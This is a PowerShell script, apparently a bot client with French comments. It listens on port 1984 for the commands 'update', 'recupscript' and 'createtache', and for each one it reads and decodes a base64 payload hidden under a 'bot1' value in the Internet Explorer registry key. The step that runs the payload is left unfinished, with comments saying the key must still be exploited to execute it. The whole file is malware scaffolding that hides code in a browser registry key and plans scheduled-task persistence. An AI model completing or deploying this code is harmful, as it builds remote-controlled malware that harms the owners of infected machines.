import-module "C:\lib\script1.ps1" -force


$cle = "bot1"

function global:FRX_Socket-MessageAction{
    param($message)
    $stop = $false
    switch ($message) {
        {$_ -match "update"}{
            write-host "update en cours" -ForegroundColor green
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))

            <#
            Il faut maintenant exploiter la clé pour exécuter la fonction

            #>

            }
        {$_ -match "recupscript"       }{
            write-host "récupération du script en cours" -ForegroundColor green
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))

            <#
            Il faut maintenant exploiter la clé pour exécuter la fonction

            #>            
            
            
            }
        {$_ -match "createtache"       }{
            write-host "création de la tâche en cours" -ForegroundColor green
            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))

            <#
            Il faut maintenant exploiter la clé pour exécuter la fonction

            #>            
            
            
            }
        Default {write-host $message}
    }

    return $stop
}

#netstat -ano | find "1984"
$socket   = FRX_Socket-Listen-Connect -port 1984
do{
   $message  = FRX_Socket-Listen-Read -socket $socket -buffersize 512
   $stop = FRX_Socket-MessageAction -message $message
}until($stop)

$closeACK = FRX_Socket-Listen-Close -socket $socket
